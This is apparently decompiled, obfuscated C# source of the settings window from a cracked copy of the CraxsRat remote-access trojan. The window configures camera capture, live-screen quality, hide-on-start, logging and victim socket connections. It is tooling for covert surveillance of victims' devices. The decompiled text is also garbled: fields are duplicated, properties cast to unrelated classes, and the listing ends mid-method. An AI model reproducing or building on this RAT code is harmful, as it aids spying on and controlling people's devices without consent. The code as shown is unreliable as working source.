// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.CraxsSettings
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class CraxsSettings : Form
  {
    public string SelectedCamera;
    public string CamerID;
    public bool Changed;
    private int frameRate;
    private bool newphoto;
    private static readonly IntPtr HWND_TOPMOST;
    public static byte f004EF1;
    private const uint SWP_NOMOVE = 2;
    public static byte f004EF3;
    private bool keepmeto;
    private IContainer components;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    private List<Rectangle> RectInputText0;
    private IContainer components;
    private bool BoxTitlePaintEventArgsWait;
    public bool Programmatically;
    public Color default_color;
    public Color _new_color;
    private Bitmap Bmp;
    private Graphics G;
    public static byte f004F0D;
    private Point p1;
    private bool s_mouse1;
    private Point p0;
    private bool s_mouse0;
    private string TEXT_COLOR;
    private IContainer components;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    public string tmpFolderUSER;

    internal virtual Label Label4
    {
      get => ((Dialog1) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Dialog1) this)._Label4 = value;
    }

    internal virtual Label Label5
    {
      get => ((Dialog1) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Dialog1) this)._Label5 = value;
    }

    internal virtual Label Label6
    {
      get => ((DialogPloice) this)._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Label6 = value;
    }

    internal virtual Label Label7
    {
      get => ((DialogPloice) this)._Label7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Label7 = value;
    }

    internal virtual Label Label8
    {
      get => ((DialogPloice) this)._Label8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Label8 = value;
    }

    internal virtual ComboBox FMQ
    {
      get => ((DialogPloice) this)._FMQ;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._FMQ = value;
    }

    internal virtual Label Label9
    {
      get => ((DialogPloice) this)._Label9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Label9 = value;
    }

    internal virtual DrakeUIButtonIcon resetbtn
    {
      get => ((DialogPloice) this)._resetbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar2_Click);
label_1:
        int num1 = -311518019;
        DrakeUIButtonIcon resetbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~--num1 ^ -230629991)) % 9U)
          {
            case 0:
              ((DialogPloice) this)._resetbtn = value;
              num1 = -1724558223;
              continue;
            case 1:
              resetbtn = ((DialogPloice) this)._resetbtn;
              num1 = (int) num2 * -134023241 ^ -1854195642;
              continue;
            case 2:
              int num3 = resetbtn == null ? -757605606 : (num3 = -149506691);
              num1 = num3 ^ (int) num2 * -546635797;
              continue;
            case 3:
              goto label_1;
            case 4:
              resetbtn.Click -= eventHandler;
              num1 = (int) num2 * -660968438 ^ 1558270409;
              continue;
            case 5:
              resetbtn = ((DialogPloice) this)._resetbtn;
              num1 = (int) num2 * 1082366162 ^ 392538187;
              continue;
            case 6:
              resetbtn.Click += eventHandler;
              num1 = (int) num2 * -1614920398 ^ -1785334144;
              continue;
            case 7:
              int num4 = resetbtn == null ? -2068095712 : (num4 = -1123593929);
              num1 = num4 ^ (int) num2 * -1784410406;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon savebtn
    {
      get => ((DialogPloice) this)._savebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar1_Click);
        DrakeUIButtonIcon savebtn = ((DialogPloice) this)._savebtn;
        if (savebtn == null)
          goto label_5;
label_1:
        int num1 = -2002585689;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ 275140791 * ((389218792 ^ 1460167843) + -1461377708 ^ 1969088092 - 1628266404 ^ --1741906192 ^ -1291972753 * 847746723)) * -2083556561 + 615252569 * -337005123)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              savebtn = ((DialogPloice) this)._savebtn;
              int num3 = savebtn == null ? 44037193 : (num3 = -351679606);
              num1 = num3 ^ (int) num2 * -1404233822;
              continue;
            case 2:
              goto label_3;
            case 3:
              savebtn.Click += eventHandler;
              num1 = (int) num2 * 1856961902 ^ -984747635;
              continue;
            case 4:
              savebtn.Click -= eventHandler;
              num1 = (int) num2 * 1829072027 ^ -1151376552;
              continue;
            case 5:
              goto label_5;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((DialogPloice) this)._savebtn = value;
        num1 = -622172376;
        goto label_2;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((DialogPloice) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel2_MouseDown);
        Panel panel2 = ((DialogPloice) this)._Panel2;
        if (panel2 == null)
          goto label_6;
label_1:
        int num1 = 243888241;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(-(-(-(--1948814697 + (-848338318 ^ 912713138)) + -(1587261020 + 1920279006 ^ -1913514773 * 1622145954)) - num2) + (--1241478800 - -847561853)) ^ -1946156981 ^ -1118694969)) % 7U)
          {
            case 0:
              int num4 = panel2 == null ? -30481677 : (num4 = -543191526);
              num1 = num4 ^ (int) num3 * -1035535680;
              continue;
            case 1:
              goto label_3;
            case 2:
              panel2.MouseDown += mouseEventHandler;
              num1 = (int) num3 * 1648823457 ^ -2021318479;
              continue;
            case 3:
              panel2.MouseDown -= mouseEventHandler;
              num1 = (int) num3 * 1877361949 ^ 1047794168;
              continue;
            case 4:
              goto label_1;
            case 5:
              panel2 = ((DialogPloice) this)._Panel2;
              num1 = (int) num3 * 1458166023 ^ -896182465;
              continue;
            case 6:
              goto label_6;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_6:
        ((DialogPloice) this)._Panel2 = value;
        num1 = 270067438;
        goto label_2;
      }
    }

    internal virtual Label Label3
    {
      get => ((DialogPloice) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Label3 = value;
    }

    internal virtual ComboBox LiveSQ
    {
      get => ((DialogPloice) this)._LiveSQ;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._LiveSQ = value;
    }

    internal virtual Label Label12
    {
      get => ((DialogPloice) this)._Label12;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Label12 = value;
    }

    internal virtual Panel Panel3
    {
      get => ((DialogPloice) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._Panel3 = value;
    }

    internal virtual ComboBox LSFPS
    {
      get => ((DialogPloice) this)._LSFPS;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((DialogPloice) this)._LSFPS = value;
    }

    internal virtual Label Label14
    {
      get => ((Download) this)._Label14;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Label14 = value;
    }

    internal virtual Label Label15
    {
      get => ((Download) this)._Label15;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Label15 = value;
    }

    internal virtual ComboBox lngtext
    {
      get => ((Download) this)._lngtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._lngtext = value;
    }

    internal virtual Label recordfps
    {
      get => ((Download) this)._recordfps;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._recordfps = value;
    }

    internal virtual Label Label13
    {
      get => ((Download) this)._Label13;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Label13 = value;
    }

    internal virtual ComboBox selectedsoundcombo
    {
      get => ((Download) this)._selectedsoundcombo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Selectedsoundcombo_SelectedIndexChanged);
label_1:
        int num1 = 153033843;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ComboBox selectedsoundcombo;
          switch ((num3 = (uint) (-~(1375263170 + 1254659343) - (num2 - -(141736625 * 2090109201 + -~(855933407 - 1171440423)) ^ ~--794539397 - 1112004517 * ~1884019983 - 1516401752))) % 8U)
          {
            case 0:
              selectedsoundcombo.SelectedIndexChanged += eventHandler;
              num1 = (int) num3 * -199748708 ^ 870549441;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              selectedsoundcombo = ((Download) this)._selectedsoundcombo;
              num1 = (int) num3 * 1413063501 ^ 745614717;
              continue;
            case 4:
              int num4 = selectedsoundcombo == null ? 1075475900 : (num4 = 1019591239);
              num1 = num4 ^ (int) num3 * -656940940;
              continue;
            case 5:
              int num5 = selectedsoundcombo == null ? -1485177657 : (num5 = -120484440);
              num1 = num5 ^ (int) num3 * -554322626;
              continue;
            case 6:
              ((Download) this)._selectedsoundcombo = value;
              selectedsoundcombo = ((Download) this)._selectedsoundcombo;
              num1 = 1440082685;
              continue;
            case 7:
              selectedsoundcombo.SelectedIndexChanged -= eventHandler;
              num1 = (int) num3 * 1661363207 ^ 100492197;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label16
    {
      get => ((Download) this)._Label16;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Label16 = value;
    }

    internal virtual DrakeUIOSSwitch Checksaveit
    {
      get => ((Download) this)._Checksaveit;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Checksaveit = value;
    }

    internal virtual DrakeUIOSSwitch CheckFMI
    {
      get => ((Download) this)._CheckFMI;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._CheckFMI = value;
    }

    internal virtual DrakeUITitleLine Generaltext
    {
      get => ((Download) this)._Generaltext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Generaltext = value;
    }

    internal virtual DrakeUIOSSwitch Checkupdate
    {
      get => ((Download) this)._Checkupdate;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Checkupdate = value;
    }

    internal virtual DrakeUIOSSwitch CheckHidecoonstart
    {
      get => ((Download) this)._CheckHidecoonstart;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Download) this)._CheckHidecoonstart = value;
      }
    }

    internal virtual DrakeUIOSSwitch Checklogit
    {
      get => ((Download) this)._Checklogit;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Checklogit = value;
    }

    internal virtual DrakeUIOSSwitch CheckNotifiDis
    {
      get => ((Download) this)._CheckNotifiDis;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._CheckNotifiDis = value;
    }

    internal virtual DrakeUITitleLine Label1
    {
      get => ((Download) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Label1 = value;
    }

    internal virtual Panel gpanel
    {
      get => ((Download) this)._gpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._gpanel = value;
    }

    internal virtual DrakeUIOSSwitch CheckNotifi
    {
      get => ((Download) this)._CheckNotifi;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._CheckNotifi = value;
    }

    internal virtual DrakeUIOSSwitch Checkplysound
    {
      get => ((Download) this)._Checkplysound;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Download) this)._Checkplysound = value;
    }

    internal virtual DrakeUITitleLine label10
    {
      get => ((Drooper) this)._label10;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._label10 = value;
    }

    internal virtual Panel apanel
    {
      get => ((Drooper) this)._apanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._apanel = value;
    }

    internal virtual Panel fpanel
    {
      get => ((Drooper) this)._fpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._fpanel = value;
    }

    internal virtual Panel Panel4
    {
      get => ((Drooper) this)._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Panel4 = value;
    }

    internal virtual Label Label2
    {
      get => ((Drooper) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Label2 = value;
    }

    internal virtual ComboBox resolutioncombo
    {
      get => ((Drooper) this)._resolutioncombo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Resolutioncombo_MouseClick);
        ComboBox resolutioncombo = ((Drooper) this)._resolutioncombo;
label_1:
        int num1 = -399815088;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-1100502245 - (~(num2 ^ ~1912297245 + (2029461419 ^ -1986063404 - -1725106908 ^ 110167615 * 658503731 ^ (-1354011971 - -1084329549) * 1670088399)) - 1295206665 + (~1081506448 + (1455048145 - 294092103))) - 862744292)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Drooper) this)._resolutioncombo = value;
              resolutioncombo = ((Drooper) this)._resolutioncombo;
              num1 = 1557726650;
              continue;
            case 2:
              goto label_3;
            case 3:
              resolutioncombo.MouseClick += mouseEventHandler;
              num1 = (int) num3 * 1202073380 ^ -1333526224;
              continue;
            case 4:
              int num4 = resolutioncombo == null ? -1679329369 : (num4 = -1495063227);
              num1 = num4 ^ (int) num3 * 1604583571;
              continue;
            case 5:
              resolutioncombo.MouseClick -= mouseEventHandler;
              num1 = (int) num3 * 1628312857 ^ -1883012960;
              continue;
            case 6:
              int num5 = resolutioncombo == null ? 271095476 : (num5 = -821064629);
              num1 = num5 ^ (int) num3 * -1722236521;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUITitleLine label11
    {
      get => ((Drooper) this)._label11;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._label11 = value;
    }

    internal virtual DrakeUITitleLine DrakeUITitleLine1
    {
      get => ((Drooper) this)._DrakeUITitleLine1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Drooper) this)._DrakeUITitleLine1 = value;
      }
    }

    internal virtual PictureBox PictureBox2
    {
      get => ((Drooper) this)._PictureBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._PictureBox2 = value;
    }

    internal virtual Label Label17
    {
      get => ((Drooper) this)._Label17;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label17_Click);
label_1:
        int num1 = -1408547840;
        Label label17;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 * -1663306945 * 1681045093 ^ -782407793 * ~-1281782624)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              label17.Click += eventHandler;
              num1 = (int) num2 * 1948429820 ^ 1910687617;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((Drooper) this)._Label17 = value;
              num1 = 1346299225;
              continue;
            case 4:
              label17 = ((Drooper) this)._Label17;
              int num3 = label17 == null ? -528260895 : (num3 = 276495770);
              num1 = num3 ^ (int) num2 * -1020339033;
              continue;
            case 5:
              label17 = ((Drooper) this)._Label17;
              int num4 = label17 == null ? 2057369331 : (num4 = -1565311800);
              num1 = num4 ^ (int) num2 * 18205899;
              continue;
            case 6:
              label17.Click -= eventHandler;
              num1 = (int) num2 * 765404230 ^ 656969762;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel5
    {
      get => ((Drooper) this)._Panel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Panel5 = value;
    }

    internal virtual Label Label18
    {
      get => ((Drooper) this)._Label18;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Label18 = value;
    }

    internal virtual Panel Panel6
    {
      get => ((Drooper) this)._Panel6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Panel6 = value;
    }

    internal virtual DrakeUITitleLine DrakeUITitleLine2
    {
      get => ((Drooper) this)._DrakeUITitleLine2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Drooper) this)._DrakeUITitleLine2 = value;
      }
    }

    internal virtual WebBrowser LogBrowser
    {
      get => ((Drooper) this)._LogBrowser;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._LogBrowser = value;
    }

    internal virtual DrakeUIButtonIcon checkupdatbtn
    {
      get => ((Drooper) this)._checkupdatbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Checkupdatbtn_Click);
        DrakeUIButtonIcon checkupdatbtn = ((Drooper) this)._checkupdatbtn;
label_1:
        int num1 = -2010880218;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * -250836207 - -(-1677632735 - ((-467497638 ^ -900713725) + ~1026467924)) + (~(-667645580 - -1657921377) - ((1480410402 ^ 648884596) - --1481969972)) + (~-1697910393 - 110530987 * 1046772083)) * 1618502441 * -1632220317)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Drooper) this)._checkupdatbtn = value;
              checkupdatbtn = ((Drooper) this)._checkupdatbtn;
              num1 = 419946948;
              continue;
            case 2:
              goto label_3;
            case 3:
              checkupdatbtn.Click += eventHandler;
              num1 = (int) num2 * -23753671 ^ 1832909286;
              continue;
            case 4:
              int num3 = checkupdatbtn == null ? -1254458710 : (num3 = 1323684408);
              num1 = num3 ^ (int) num2 * -330861409;
              continue;
            case 5:
              checkupdatbtn.Click -= eventHandler;
              num1 = (int) num2 * 1741823877 ^ -1803338216;
              continue;
            case 6:
              int num4 = checkupdatbtn == null ? 1412554825 : (num4 = 244413227);
              num1 = num4 ^ (int) num2 * 310969080;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel7
    {
      get => ((Drooper) this)._Panel7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Panel7 = value;
    }

    internal virtual PictureBox PictureBox3
    {
      get => ((Drooper) this)._PictureBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PictureBox3_Click);
label_1:
        int num1 = 1995172682;
        while (true)
        {
          int num2 = num1;
          uint num3;
          PictureBox pictureBox3;
          switch ((num3 = (uint) (-(1860922535 * ~990436677) - (num2 * 875638995 ^ 305986232 ^ -1001075015 * (-2136090420 ^ -1988103473) - ~(-1560037207 ^ 2029906986)))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              pictureBox3 = ((Drooper) this)._PictureBox3;
              num1 = (int) num3 * -824710382 ^ -1046807738;
              continue;
            case 2:
              goto label_3;
            case 3:
              pictureBox3.Click -= eventHandler;
              num1 = (int) num3 * -468225406 ^ 1614414760;
              continue;
            case 4:
              pictureBox3 = ((Drooper) this)._PictureBox3;
              int num4 = pictureBox3 == null ? 1865417089 : (num4 = 618767733);
              num1 = num4 ^ (int) num3 * -1586159623;
              continue;
            case 5:
              ((Drooper) this)._PictureBox3 = value;
              num1 = 1599249123;
              continue;
            case 6:
              pictureBox3.Click += eventHandler;
              num1 = (int) num3 * 1184590495 ^ -397780497;
              continue;
            case 7:
              int num5 = pictureBox3 == null ? 917019127 : (num5 = -1483130879);
              num1 = num5 ^ (int) num3 * -1201861801;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual PictureBox PictureBox6
    {
      get => ((Drooper) this)._PictureBox6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PictureBox6_Click);
        PictureBox pictureBox6 = ((Drooper) this)._PictureBox6;
label_1:
        int num1 = -795041657;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-~(num1 * -52843529 ^ ~(~(1742340607 - 915815936) ^ -1000438290)) ^ -1253057517 * -964393859)) % 8U)
          {
            case 0:
              ((Drooper) this)._PictureBox6 = value;
              num1 = -800443893;
              continue;
            case 1:
              int num3 = pictureBox6 == null ? -59120054 : (num3 = -1687539079);
              num1 = num3 ^ (int) num2 * 1614289464;
              continue;
            case 2:
              goto label_3;
            case 3:
              pictureBox6.Click += eventHandler;
              num1 = (int) num2 * -251189210 ^ 279620178;
              continue;
            case 4:
              int num4 = pictureBox6 == null ? -1455857532 : (num4 = -1617768535);
              num1 = num4 ^ (int) num2 * -540023177;
              continue;
            case 5:
              pictureBox6 = ((Drooper) this)._PictureBox6;
              num1 = (int) num2 * 935698321 ^ 1495877883;
              continue;
            case 6:
              goto label_1;
            case 7:
              pictureBox6.Click -= eventHandler;
              num1 = (int) num2 * 663101959 ^ 283414955;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual PictureBox PictureBox5
    {
      get => ((Drooper) this)._PictureBox5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PictureBox5_Click);
label_1:
        int num1 = 1348632842;
        while (true)
        {
          int num2 = num1;
          uint num3;
          PictureBox pictureBox5;
          switch ((num3 = (uint) ~((-(~~(-1325909091 - 1607882043) - -(-1463230682 - 645576333 - -32809741) - num2 * 1076230405) ^ (1771497443 ^ -692611954) - -732973875) * 1542465649)) % 7U)
          {
            case 0:
              ((Drooper) this)._PictureBox5 = value;
              num1 = -1254170016;
              continue;
            case 1:
              pictureBox5 = ((Drooper) this)._PictureBox5;
              int num4 = pictureBox5 == null ? -1988743635 : (num4 = 669005482);
              num1 = num4 ^ (int) num3 * 1037660767;
              continue;
            case 2:
              pictureBox5.Click -= eventHandler;
              num1 = (int) num3 * 1218554533 ^ 662095891;
              continue;
            case 3:
              pictureBox5.Click += eventHandler;
              num1 = (int) num3 * 2131936883 ^ 1853819644;
              continue;
            case 4:
              pictureBox5 = ((Drooper) this)._PictureBox5;
              int num5 = pictureBox5 == null ? -1595795786 : (num5 = 54213910);
              num1 = num5 ^ (int) num3 * -1377737339;
              continue;
            case 5:
              goto label_1;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Drooper) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel1_MouseDown);
        Panel panel1 = ((Drooper) this)._Panel1;
label_1:
        int num1 = -750517098;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 * -2072572727 ^ ~((2143069852 ^ 1221199656) - 513940835 - (~-1623954104 - --408495789))) - ~(-967986036 + -268748987)) ^ ~1374011708 ^ 1987064910)) % 7U)
          {
            case 0:
              panel1.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -549562494 ^ -1729530129;
              continue;
            case 1:
              ((Drooper) this)._Panel1 = value;
              num1 = 553483575;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = panel1 == null ? 904785642 : (num3 = -932692582);
              num1 = num3 ^ (int) num2 * 647331260;
              continue;
            case 4:
              panel1 = ((Drooper) this)._Panel1;
              int num4 = panel1 == null ? -1869480617 : (num4 = -1931266688);
              num1 = num4 ^ (int) num2 * -921303192;
              continue;
            case 5:
              panel1.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * -1268140398 ^ 654675118;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
    {
      get => ((Drooper) this)._DrakeUISymbolLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.DrakeUISymbolLabel1_MouseDown);
label_1:
        int num1 = -668457014;
        DrakeUISymbolLabel drakeUiSymbolLabel1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-(num1 + --1438540903 * 1471645869 * -1075735807) - ~(--1799200596 - (-820015425 ^ 2137440837)) - --2006660263) - -2090554929)) % 9U)
          {
            case 0:
              drakeUiSymbolLabel1.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -1671792088 ^ 1231904048;
              continue;
            case 1:
              int num3 = drakeUiSymbolLabel1 == null ? 377645057 : (num3 = 78100064);
              num1 = num3 ^ (int) num2 * -80056155;
              continue;
            case 2:
              goto label_1;
            case 3:
              drakeUiSymbolLabel1 = ((Drooper) this)._DrakeUISymbolLabel1;
              num1 = (int) num2 * -1102272012 ^ 1690381770;
              continue;
            case 4:
              int num4 = drakeUiSymbolLabel1 == null ? -721033997 : (num4 = -1582620384);
              num1 = num4 ^ (int) num2 * 161143102;
              continue;
            case 5:
              ((Drooper) this)._DrakeUISymbolLabel1 = value;
              num1 = -1166344408;
              continue;
            case 6:
              goto label_3;
            case 7:
              drakeUiSymbolLabel1.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * -2006066591 ^ -1638659300;
              continue;
            case 8:
              drakeUiSymbolLabel1 = ((Drooper) this)._DrakeUISymbolLabel1;
              num1 = (int) num2 * -446784187 ^ 498331558;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon exitbtn
    {
      get => ((Drooper) this)._exitbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
label_1:
        int num1 = -1144381473;
        DrakeUIButtonIcon exitbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((---num1 ^ ~-801745083) - (298751346 - 268449321) ^ 2140118015)) % 8U)
          {
            case 0:
              exitbtn.Click -= eventHandler;
              num1 = (int) num2 * 1066032108 ^ 163239050;
              continue;
            case 1:
              exitbtn.Click += eventHandler;
              num1 = (int) num2 * -892681804 ^ -344992896;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = exitbtn == null ? -732914010 : (num3 = -950091046);
              num1 = num3 ^ (int) num2 * 1327550916;
              continue;
            case 4:
              ((Drooper) this)._exitbtn = value;
              exitbtn = ((Drooper) this)._exitbtn;
              num1 = -4023800;
              continue;
            case 5:
              exitbtn = ((Drooper) this)._exitbtn;
              num1 = (int) num2 * -1379371125 ^ 1984846750;
              continue;
            case 6:
              int num4 = exitbtn == null ? -1483104346 : (num4 = -968579095);
              num1 = num4 ^ (int) num2 * -1140714541;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public CraxsSettings()
    {
label_1:
      int num1 = 1154224634;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (1027282570 - (-((~-1217690535 ^ 1726999132 - 1000872287) + (2038585193 - 1017996790 + -878894617)) - -num2))) % 6U)
        {
          case 0:
            ((Drooper) this).sizearry = new string[19]
            {
              EXGuarder.\u0032C6F3E70,
              EXGuarder.\u00313225708,
              EXGuarder.\u0035633460D,
              EXGuarder.\u003113A2F33,
              EXGuarder.\u00372156B6D,
              EXGuarder.\u0033A092D02,
              EXGuarder.\u003190B6949,
              EXGuarder.\u003432A3F2D,
              EXGuarder.\u00310424B2A,
              EXGuarder.\u0031E166E33,
              EXGuarder.\u003100B4C64,
              EXGuarder.\u00331176717,
              EXGuarder.\u003486C514A,
              EXGuarder.\u0032E373656,
              EXGuarder.\u00333350E18,
              EXGuarder.\u00373694150,
              EXGuarder.\u0031609401A,
              EXGuarder.\u0031C485728,
              EXGuarder.\u0035F220204
            };
            ((Drooper) this).progma = false;
            num1 = (int) num3 * -615006031 ^ 1772859025;
            continue;
          case 1:
            this.Load += new EventHandler(this.CypherSettings_Load);
            num1 = (int) num3 * 5259990 ^ 1219898379;
            continue;
          case 2:
            goto label_1;
          case 3:
            // ISSUE: reference to a compiler-generated method
            ((ContactsManager._Closure\u0024__) this).InitializeComponent();
            num1 = (int) num3 * 281322931 ^ -338510441;
            continue;
          case 4:
            ((Drooper) this).first = true;
            num1 = (int) num3 * 1809890889 ^ 1893048612;
            continue;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void CypherSettings_Load(object sender, EventArgs e)
    {
      string email = RegistryHandler.Get_EMAIL();
      if (!(email == null | string.IsNullOrEmpty(email)))
        goto label_5;
label_1:
      int num1 = -1251138672;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string[] sizearry;
        switch ((num3 = (uint) -((~(-860515433 ^ 1444788866) ^ ~-1220334677 + ~-594783240) * -366336537 - num2 * 1233923065 - 933179201)) % 9U)
        {
          case 1:
            email = EXGuarder.\u0030D2F3E46;
            num1 = (int) num3 * -1227205285 ^ -1093582725;
            continue;
          case 2:
            goto label_5;
          case 3:
            goto label_1;
          case 4:
            int num4;
